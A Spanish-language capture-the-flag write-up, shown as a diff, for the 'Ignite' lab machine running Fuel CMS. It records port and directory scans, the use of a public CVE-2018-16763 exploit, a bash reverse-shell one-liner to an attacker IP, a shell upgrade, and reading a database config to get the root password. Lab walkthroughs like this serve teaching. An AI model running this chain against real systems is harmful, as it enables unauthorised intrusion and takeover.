@@ -1,0 +1,101 @@
+maquina ignite
+
+# nmap -p- --open -sS -T5 -vvv -n -Pn 10.10.180.90 -oG puertos
+80
+# nmap -sC -sV 10.10.180.90
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Welcome to FUEL CMS
+| http-robots.txt: 1 disallowed entry 
+|_/fuel/
+
+#searchsploit fuel cms
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+fuel CMS 1.4.1 - Remote Code Execution (1)    | linux/webapps/47138.py
+Fuel CMS 1.4.1 - Remote Code Execution (2)    | php/webapps/49487.rb
+Fuel CMS 1.4.1 - Remote Code Execution (3)    | php/webapps/50477.py
+Fuel CMS 1.4.13 - 'col' Blind SQL Injection ( | php/webapps/50523.txt
+Fuel CMS 1.4.7 - 'col' SQL Injection (Authent | php/webapps/48741.txt
+Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Inject | php/webapps/48778.txt
+Fuel CMS 1.5.0 - Cross-Site Request Forgery ( | php/webapps/50884.txt
+---------------------------------------------- ---------------------------------
+
+#gobuster dir -u http://10.10.180.90  -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+/.hta                 (Status: 403) [Size: 291]
+/.htpasswd            (Status: 403) [Size: 296]
+/@                    (Status: 400) [Size: 1134]
+/.htaccess            (Status: 403) [Size: 296]
+/0                    (Status: 200) [Size: 16595]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.180.90/assets/]
+/home                 (Status: 200) [Size: 16595]
+/index                (Status: 200) [Size: 16595]
+/index.php            (Status: 200) [Size: 16595]
+/lost+found           (Status: 400) [Size: 1134]
+/offline              (Status: 200) [Size: 70]
+/robots.txt           (Status: 200) [Size: 30]
+/server-status        (Status: 403) [Size: 300]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+
+
+buscando vulnerabilidades para fuel cms encontramos el cve 2018-16763 
+https://github.com/padsalatushal/CVE-2018-16763
+
+utilizamos el exploit de 
+https://github.com/crypticdante/CVE-2018-16763
+
+con este exploit podemos injetar comando y asi obtener una reverse shell
+con este comando:
+#	bash -c "bash -i >& /dev/tcp/10.8.98.229/4444 0>&1"
+
+con esto podemos ver la primera flag
+ como no tenemos tty no podemos usar sudo -l 
+esto lo solucionamos con
+#	python -c 'import pty; pty.spawn("/bin/bash")'
+
+ahora no tenemos la pass del usuario para utilizar sudo -l asi que utilizamos 
+# find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
+que nos deja como resultado:
+-rwxr-sr-x 1 root shadow 35632 Apr  9  2018 /sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 35600 Apr  9  2018 /sbin/unix_chkpwd
+-rwsr-xr-- 1 root dip 	394984 Jun 12  2018 /usr/sbin/pppd
+
+hay que continuar buscando informacion para escalar privilegios
+
+revisando en el archivo ../fuel/application/config/database.php vemo esto
+
+$active_group = 'default';
+$query_builder = TRUE;
+
+$db['default'] = array(
+	'dsn'	=> '',
+	'hostname' => 'localhost',
+#	'username' => 'root',
+#	'password' => 'mememe',
+	'database' => 'fuel_schema',
+	'dbdriver' => 'mysqli',
+	'dbprefix' => '',
+	'pconnect' => FALSE,
+	'db_debug' => (ENVIRONMENT !== 'production'),
+	'cache_on' => FALSE,
+	'cachedir' => '',
+	'char_set' => 'utf8',
+	'dbcollat' => 'utf8_general_ci',
+	'swap_pre' => '',
+	'encrypt' => FALSE,
+	'compress' => FALSE,
+	'stricton' => FALSE,
+	'failover' => array(),
+	'save_queries' => TRUE
+);
+
+ahora podemos probar entrar como root o bien intentar utilizar el sudo -l
+
+justamente asigando una tty por meido de python utilizamos 
+#su root 
+y con la pass mememe accedemos como root, con esto ya podemos leer la flag root.txt
+
